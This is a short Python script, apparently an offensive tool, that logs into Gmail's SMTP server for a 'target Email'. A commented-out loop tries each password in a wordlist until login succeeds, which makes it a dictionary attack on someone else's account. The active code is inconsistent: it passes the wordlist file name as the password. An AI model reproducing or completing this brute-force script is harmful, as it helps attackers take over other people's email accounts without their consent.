#!/usr/bin/env python3
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

username = input("Enter target Email: ")
password = input("Enter the pass file: ")

smtpserver.login(username, password)






# with open(passfile,'r') as wordlist:
# 	for each in wordlist:
# 		password = each.strip()
# 		try:
# 			smtpserver.login(username, password)
# 			print("found")
# 			break
# 		except smtplib.SMTPAuthenticationError:
# 			print("trying: " + password + "not the password")


